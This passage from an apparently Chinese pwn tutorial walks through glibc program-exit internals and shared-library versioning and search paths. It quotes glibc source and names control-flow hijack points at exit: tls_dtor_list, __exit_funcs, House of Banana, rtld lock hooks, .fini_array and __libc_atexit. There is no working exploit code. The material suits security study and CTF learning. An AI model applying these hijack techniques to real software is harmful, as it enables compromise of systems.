<li>依次调用函数指针数组 <code>__init_array_start</code>（<code>.init_array</code>）中的所有函数。<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_init (<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* For dynamically linked executables the preinit array is executed by</span></span><br><span class="line"><span class="comment">     the dynamic linker (before initializing any shared object).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="comment">/* For static executables, preinit happens right before init.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">size_t</span> size = __preinit_array_end - __preinit_array_start;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__preinit_array_start [i]) (argc, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _init ();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> size = __init_array_end - __init_array_start;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">      (*__init_array_start [i]) (argc, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
其中调用的 <code>init</code> 函数如下：<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.init:0000037C push    ebx                             ; _init</span><br><span class="line">.init:0000037D sub     esp, 8</span><br><span class="line">.init:00000380 call    __x86_get_pc_thunk_bx</span><br><span class="line">.init:00000380</span><br><span class="line">.init:00000385 add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $)</span><br><span class="line">.init:0000038B mov     eax, ds:(__gmon_start___ptr - 1FD8h)[ebx]</span><br><span class="line">.init:00000391 test    eax, eax</span><br><span class="line">.init:00000393 jz      short loc_39A</span><br><span class="line">.init:00000393</span><br><span class="line">.init:00000395 call    ___gmon_start__</span><br><span class="line">.init:00000395</span><br><span class="line">.init:0000039A</span><br><span class="line">.init:0000039A loc_39A:                                ; CODE XREF: _init_proc+17↑j</span><br><span class="line">.init:0000039A add     esp, 8</span><br><span class="line">.init:0000039D pop     ebx</span><br><span class="line">.init:0000039E retn</span><br></pre></td></tr></table></figure></div>
在静态链接程序中直接 <code>mov eax, 0; test eax, eax;</code> ，因此这个函数什么也不做。而动态链接程序中由于此时 <code>__gmon_start___@got</code> 为 NULL ，因此同样什么也不做。</li>
</ul>
<p>从 <code>__libc_csu_init</code> 函数返回后会调用 <code>main</code> 函数和 <code>exit</code> 函数。</p>
<h2 id="exit-中的-hook"><a href="#exit-中的-hook" class="headerlink" title="exit 中的 hook"></a>exit 中的 hook</h2><p><code>exit</code> 函数定义如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//stdlib/exit.c</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit</span> <span class="params">(<span class="type">int</span> status)</span> &#123;</span><br><span class="line">    __run_exit_handlers (status, &amp;__exit_funcs, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden __run_exit_handlers (<span class="type">int</span> status, <span class="keyword">struct</span> exit_function_list **listp, <span class="type">bool</span> run_list_atexit) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SHARED</span></span><br><span class="line">    <span class="keyword">if</span> (&amp;__call_tls_dtors != <span class="literal">NULL</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        <span class="comment">//首先销毁TLS</span></span><br><span class="line">        __call_tls_dtors ();</span><br><span class="line">    <span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line">    <span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        *listp = cur-&gt;next;</span><br><span class="line">        <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">	        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">        RUN_HOOK (__libc_atexit, ());</span><br><span class="line">    _exit (status);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    _exit (int status) &#123;</span></span><br><span class="line"><span class="comment">        status &amp;= 0xff;</span></span><br><span class="line"><span class="comment">        abort ();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先 <code>__call_tls_dtors</code> 会被 <code>exit</code> 调用。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __call_tls_dtors (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (tls_dtor_list) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">cur</span> =</span> tls_dtor_list;</span><br><span class="line">        dtor_func func = cur-&gt;func;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">        PTR_DEMANGLE (func);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        tls_dtor_list = tls_dtor_list-&gt;next;</span><br><span class="line">        func (cur-&gt;obj);</span><br><span class="line"></span><br><span class="line">        atomic_fetch_add_release (&amp;cur-&gt;<span class="built_in">map</span>-&gt;l_tls_dtor_count, <span class="number">-1</span>);</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>泄露 <code>pointer_guard</code> 后可以劫持 <code>tls_dtor_list</code> ，构造 <code>dtor_list</code> 结构体控制 rdi（<code>obj</code> 域）和 rdx（<code>next</code> 域），进而利用 <code>setcontext</code> 来劫持程序执行流程 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> &#123;</span></span><br><span class="line">    dtor_func func;</span><br><span class="line">    <span class="type">void</span> *obj;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">map</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dtor_list</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>泄露 <code>pointer_guard</code> 后（如果该 glibc 版本加密了该函数指针）可以通过劫持 <code>__exit_funcs</code> 数组来获取控制流。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//遍历__exit_funcs,包括_dl_fini</span></span><br><span class="line"><span class="keyword">while</span> (*listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">cur</span> =</span> *listp;</span><br><span class="line">    <span class="keyword">while</span> (cur-&gt;idx &gt; <span class="number">0</span>) &#123;</span><br><span class="line">	    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> *<span class="title">const</span> <span class="title">f</span> =</span> &amp;cur-&gt;fns[--cur-&gt;idx];</span><br><span class="line">	    <span class="keyword">switch</span> (f-&gt;flavor) &#123;</span><br><span class="line">	        <span class="type">void</span> (*atfct) (<span class="type">void</span>);</span><br><span class="line">	        <span class="type">void</span> (*onfct) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> (*cxafct) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line"></span><br><span class="line">	        <span class="keyword">case</span> ef_free:</span><br><span class="line">	        <span class="keyword">case</span> ef_us:</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_on:</span><br><span class="line">	            onfct = f-&gt;func.on.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (onfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            onfct (status, f-&gt;func.on.arg);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_at:</span><br><span class="line">	            atfct = f-&gt;func.at;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (atfct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            atfct ();</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	        <span class="keyword">case</span> ef_cxa:</span><br><span class="line">	            cxafct = f-&gt;func.cxa.fn;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">	            PTR_DEMANGLE (cxafct);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	            cxafct (f-&gt;func.cxa.arg, status);</span><br><span class="line">	            <span class="keyword">break</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    *listp = cur-&gt;next;</span><br><span class="line">    <span class="keyword">if</span> (*listp != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">free</span> (cur);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>但这种方法只能控制 rsi 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> &#123;</span></span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> flavor;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">	    <span class="type">void</span> (*at) (<span class="type">void</span>);</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">int</span> status, <span class="type">void</span> *arg);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	    &#125; on;</span><br><span class="line">	    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	        <span class="type">void</span> (*fn) (<span class="type">void</span> *arg, <span class="type">int</span> status);</span><br><span class="line">	        <span class="type">void</span> *arg;</span><br><span class="line">	        <span class="type">void</span> *dso_handle;</span><br><span class="line">	    &#125; cxa;</span><br><span class="line">    &#125; func;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function_list</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">size_t</span> idx;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">exit_function</span> <span class="title">fns</span>[32];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>如果是<strong>动态链接程序</strong> <code>__run_exit_handlers</code> 函数会调用 <code>_dl_fini</code> 函数。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004857778.png"
                      alt="image-20241108004857778"
                ><br><code>_dl_fini</code> 函数定义如下，该函数的主要作用就是依次调用 <code>link_map-&gt;l_info[DT_FINI_ARRAY]</code> 中描述的函数数组中的函数指针。有一种攻击方法就是通过伪造 <code>link_map</code> 来实现控制流劫持，这种攻击方法叫做 <strong>House Of Banana</strong> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//省略了有关SHARED的操作</span></span><br><span class="line"><span class="type">void</span> internal_function _dl_fini (<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (Lmid_t ns = GL(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns) &#123;</span><br><span class="line">        __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">        <span class="keyword">if</span> (nloaded == <span class="number">0</span>)</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">	        <span class="keyword">struct</span> link_map *maps[nloaded];</span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">	        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">	        assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">	        <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">                <span class="comment">//将_rtld_global.dl_ns[ns]._ns_loaded链表的结点经过check后置入maps</span></span><br><span class="line">	            <span class="keyword">if</span> (l == l-&gt;l_real) &#123;</span><br><span class="line">		            assert (i &lt; nloaded);</span><br><span class="line">                    maps[i] = l;</span><br><span class="line">		            l-&gt;l_idx = i;</span><br><span class="line">		            ++i;</span><br><span class="line">		            ++l-&gt;l_direct_opencount;</span><br><span class="line">	            &#125;</span><br><span class="line">	        assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">	        assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">            <span class="comment">//_ns_loaded链表中至少有三个节点</span></span><br><span class="line">	        <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line">	        _dl_sort_fini (maps, nmaps, <span class="literal">NULL</span>, ns);</span><br><span class="line">	        __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">	        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i) &#123;</span><br><span class="line">	            <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];</span><br><span class="line">                <span class="comment">//遍历执行maps[i]里的函数指针</span></span><br><span class="line">	            <span class="keyword">if</span> (l-&gt;l_init_called) &#123;</span><br><span class="line">		            l-&gt;l_init_called = <span class="number">0</span>;</span><br><span class="line">		            <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span> || l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	        	        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask) &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">			                _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>, DSO_FILENAME (l-&gt;l_name), ns);</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			                ElfW(Addr) *<span class="built_in">array</span> = (ElfW(Addr) *) (l-&gt;l_addr + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">			                <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val / <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line">			                <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">			                    ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">			            &#125;</span><br><span class="line">		                <span class="keyword">if</span> (l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">			                DL_CALL_DT_FINI (l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">		            &#125;</span><br><span class="line">		        &#125;</span><br><span class="line">	            --l-&gt;l_direct_opencount;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外 <code>_dl_fini</code> 中的 <code>__rtld_lock_lock_recursive</code> 和 <code>__rtld_lock_unlock_recursive</code> 宏展开后分别为 <code>_rtld_local._dl_rtld_lock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code> 和 <code>_rtld_local._dl_rtld_unlock_recursive(&amp;(_rtld_local._dl_load_lock).mutex)</code> 因此我们可以劫持对应函数指针完成控制流劫持，这些函数指针就是<strong>狭义上的 exit hook</strong> 。</p>
<p>如果是<strong>静态链接程序</strong> <code>__run_exit_handlers</code> 函数会调用 <code>__libc_csu_fini</code> 函数。<code>__libc_csu_fini</code> 函数会依次调用 <code>.fini_array</code> 中的函数指针，因此我们可以通过改写 <code>.fini_array</code> 实现控制流劫持。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_csu_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LIBC_NONSHARED</span></span><br><span class="line">  <span class="type">size_t</span> i = __fini_array_end - __fini_array_start;</span><br><span class="line">  <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">    (*__fini_array_start [i]) ();</span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">ifndef</span> NO_INITFINI</span></span><br><span class="line">  _fini ();</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后调用 <code>RUN_HOOK</code> 宏：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (run_list_atexit)</span><br><span class="line">    RUN_HOOK(__libc_atexit, ());</span><br></pre></td></tr></table></figure></div>
<p>这个宏展开后的结果如下，可以看到这个宏会依次调用 <code>__start___libc_atexit</code> 函数指针数组直到遇到 NULL 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> *ptr;</span><br><span class="line">    <span class="keyword">for</span> (ptr = (<span class="type">void</span> *<span class="type">const</span> *) ((<span class="type">void</span> *<span class="type">const</span> *) (&amp;__start___libc_atexit)); !((ptr) &gt;= (<span class="type">void</span> *<span class="type">const</span> *) &amp;__stop___libc_atexit); ++ptr) (*(<span class="type">____libc_atexit_hook_function_t</span> *) *ptr)();</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>
<p>函数指针所在的内存在动态链接程序中位于 libc 上。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004928203.png"
                      alt="image-20241108004928203"
                ><br>在静态链接程序中位于程序的 <code>__libc_atexit</code> 段。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108004951294.png"
                      alt="image-20241108004951294"
                ><br>用于 <strong><code>FSOP</code></strong> 的 <code>_IO_cleanup</code> 就是在这里被调用的，另外如果我们能控制这里的函数指针也可以劫持程序执行流程。</p>
<h1 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h1><h2 id="共享库版本"><a href="#共享库版本" class="headerlink" title="共享库版本"></a>共享库版本</h2><h3 id="共享库版本命名"><a href="#共享库版本命名" class="headerlink" title="共享库版本命名"></a>共享库版本命名</h3><p>Linux有一套规则来命名系统中的每一个共享库，它规定共享库的文件名规则必须如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">libname.so.x.y.z</span><br></pre></td></tr></table></figure></div>
<p>最前面使用前缀 <code>lib</code> 、中间是库的名字和后缀 <code>.so</code> ，最后面跟着的是三个数字组成的版本号。<code>x</code> 表示主版本号（Major Version Number），<code>y</code> 表示次版本号（Minor Version Number），<code>z</code> 表示发布版本号（Release Version Number）。三个版本号的含义不一样。</p>
<ul>
<li>主版本号表示库的重大升级，不同主版本号的库之间是不兼容的，依赖于旧的主版本号的程序需要改动相应的部分，并且重新编译，才可以在新版的共享库中运行；或者，系统必须保留旧版的共享库，使得那些依赖于旧版共享库的程序能够正常运行。</li>
<li>次版本号表示库的增量升级，即增加一些新的接口符号，且保持原来的符号不变。在主版本号相同的情况下，高的次版本号的库向后兼容低的次版本号的库。</li>
<li>发布版本号表示库的一些错误的修正、性能的改进等，并不添加任何新的接口，也不对接口进行更改。相同主版本号、次版本号的共享库，不同的发布版本号之间完全兼容，依赖于某个发布版本号的程序可以在任何一个其他发布版本号中正常运行，而无须做任何修改。</li>
</ul>
<h3 id="SO-NAME"><a href="#SO-NAME" class="headerlink" title="SO-NAME"></a>SO-NAME</h3><p>系统普遍采用一种叫做 SO-NAME 的命名机制来记录共享库的依赖关系。每个共享库都有一个对应的 SO-NAME ，这个 SO-NAME 即共享库的文件名去掉次版本号和发布版本号，保留主版本号。比如一个共享库叫做 <code>libfoo.so.2.6.1</code> ，那么它的 SO-NAME 即 <code>libfoo.so.2</code> 。很明显，SO-NAME 规定了共享库的接口，SO-NAME 的两个相同共享库，次版本号大的兼容次版本号小的。在 Linux 系统中，系统会为每个共享库在它所在的目录创建一个跟 SO-NAME 相同的并且指向它的软链接（Symbol Link）。比如系统中有存在一个共享库 <code>/lib/libfoo.so.2.6.1</code> ，那么 Linux 中的共享库管理程序就会为它产生一个软链接 <code>/lib/libfoo.so.2</code> 指向它。比如 Linux 系统的 Glibc 共享库（注意稍高版本的 libc 的 <code>libc.so.6</code> 本身就是动态库，不是符号链接）：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">lrwxrwxrwx 1 root root 12 Apr  7  2022 /lib/x86_64-linux-gnu/libc.so.6 -&gt; libc-2.31.so</span><br><span class="line">$ <span class="built_in">ls</span> -l /lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">-rwxr-xr-x 1 root root 2029592 Apr  7  2022 /lib/x86_64-linux-gnu/libc-2.31.so</span><br></pre></td></tr></table></figure></div>
<p>由于历史原因，动态链接器和 C 语言库的共享对象文件名规则不按 Linux 标准的共享库命名方法，但是 C 语言的 SO-NAME 还是按照正常的规则。</p>
<p>另外动态连接器的 SO-NAME 命名不按照普通的规则。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /lib64/ld-linux-x86-64.so.2</span><br><span class="line">lrwxrwxrwx 1 root root 32 Apr  7  2022 /lib64/ld-linux-x86-64.so.2 -&gt; /lib/x86_64-linux-gnu/ld-2.31.so</span><br></pre></td></tr></table></figure></div>

<p>建立以 SO-NAME 为名字的软链接目的是，使得所有依赖某个共享库的模块，在编译、链接和运行时，都使用共享库的 SO-NAME ，而不使用详细的版本号。</p>
<p>动态链接文件中的 <code>.dynamic</code> 段中的 <code>DT_NEED</code> 类型的字段就是 SO-NAME 而不是共享库的完整名字，这样当动态链接器进行共享库依赖文件查找时，就会根据系统中各种共享库目录中的SO-NAME软链接自动定向到最新版本的共享库。</p>
<p>当共享库进行升级的时候，如果只是进行增量升级，即保持主版本号不变，只改变次版本号或发布版本号，那么我们可以直接将新版的共享库替换掉旧版，并且修改 SO-NAME 的软链接指向新版本共享库，即可实现升级；当共享库的主版本号升级时，系统中就会存在多个 SO-NAME ，由于这些 SO-NAME 并不相同，所以已有的程序并不会受影响。</p>
<p>Linux 中提供了一个工具叫做 <code>ldconfig</code> ，当系统中安装或更新一个共享库时，就需要运行这个工具，它会遍历所有的默认共享库目录，比如 <code>/lib</code> 、<code>/usr/lib</code> 等，然后更新所有的软链接，使它们指向最新版的共享库；如果安装了新的共享库，那么 <code>ldconfig</code> 会为其创建相应的软链接。</p>
<h3 id="符号版本"><a href="#符号版本" class="headerlink" title="符号版本"></a>符号版本</h3><p>根据提到的可知，一个程序所依赖的共享库的次版本号如果高于系统中的共享库，那么就不保证该程序能在该系统中运行，这类问题叫做次版本号交会问题（Minor-revision Rendezvous Problem）。</p>
<p>这种次版本号交会问题并没有因为 SO-NAME 的存在而得到任何改善。对于这个问题，现代的系统通过一种更加精巧的方式来解决，那就是符号版本机制。这个方案的基本思路是让每个导出和导入的符号都有一个相关联的版本号，它的实际做法类似于名称修饰的方法。</p>
<p><code>.dynamic</code> 段中的 <code>DT_VERSYM</code> 类型字段包含了符号版本。它的作用是维护库的版本信息，以便在运行时进行版本控制和符号解析。通过 <code>DT_VERSYM</code> ，动态链接器可以确定所链接的库的版本与运行时环境是否兼容，以及选择正确的版本来解析符号。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/07/linux-user-pwn-basic-knowlege/images/image-20241108005224309.png"
                      alt="image-20241108005224309"
                ></p>
<h2 id="共享库系统路径"><a href="#共享库系统路径" class="headerlink" title="共享库系统路径"></a>共享库系统路径</h2><p>目前大多数包括 Linux 在内的开源操作系统都遵守一个叫做 FHS（File Hierarchy Standard）的标准，这个标准规定了一个系统中的系统文件应该如何存放，包括各个目录的结构、组织和作用，这有利于促进各个开源操作系统之间的兼容性。共享库作为系统中重要的文件，它们的存放方式也被 FHS 列入了规定范围。FHS 规定，一个系统中主要有两个存放共享库的位置，它们分别如下：</p>
<ul>
<li><code>/lib</code>：该目录包含操作系统核心组件所需的共享库文件。这些库文件通常是系统引导和运行时所必需的，例如与操作系统内核相关的库文件。</li>
<li><code>/usr/lib</code>：该目录包含操作系统提供的额外共享库文件。这些库文件用于支持系统上安装的应用程序和工具的运行，如图形界面工具包（GUI toolkit）、网络库、数据库驱动程序等。</li>
<li><code>/usr/local/lib</code>：该目录是用于安装本地（local）软件的库文件的默认位置。当用户手动编译和安装软件到系统时，通常会将其安装到 <code>/usr/local</code> 目录下。因此，相关的库文件也会被安装到 <code>/usr/local/lib</code> 目录下。</li>
</ul>
<h2 id="共享库查找过程"><a href="#共享库查找过程" class="headerlink" title="共享库查找过程"></a>共享库查找过程</h2><p>动态链接器对于模块的查找有一定的规则：如果 <code>DT_NEED</code> 里面保存的是绝对路径，那么动态链接器就按照这个路径去查找；如果 <code>DT_NEED</code> 里面保存的是相对路径，那么动态链接器会在 <code>/lib</code> 、<code>/usr/lib</code> 和由 <code>/etc/ld.so.conf</code> 配置文件指定的目录中查找共享库。为了程序的可移植性和兼容性，共享库的路径往往是相对的。</p>
<p><code>ld.so.conf</code> 是一个文本配置文件，它可能包含其他的配置文件，这些配置文件中存放着目录信息。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf         </span><br><span class="line">include /etc/ld.so.conf.d/*.conf</span><br><span class="line"></span><br><span class="line">➜  ~ <span class="built_in">cat</span> /etc/ld.so.conf.d/*.conf               </span><br><span class="line">/usr/lib/x86_64-linux-gnu/libfakeroot</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/i386-linux-gnu</span><br><span class="line">/lib/i386-linux-gnu</span><br><span class="line">/usr/lib/i386-linux-gnu</span><br><span class="line">/usr/local/lib/i686-linux-gnu</span><br><span class="line">/lib/i686-linux-gnu</span><br><span class="line">/usr/lib/i686-linux-gnu</span><br><span class="line"><span class="comment"># libc default configuration</span></span><br><span class="line">/usr/local/lib</span><br><span class="line"><span class="comment"># Multiarch support</span></span><br><span class="line">/usr/local/lib/x86_64-linux-gnu</span><br><span class="line">/lib/x86_64-linux-gnu</span><br><span class="line">/usr/lib/x86_64-linux-gnu</span><br><span class="line"><span class="comment"># Legacy biarch compatibility support</span></span><br><span class="line">/lib32</span><br><span class="line">/usr/lib32</span><br></pre></td></tr></table></figure></div>
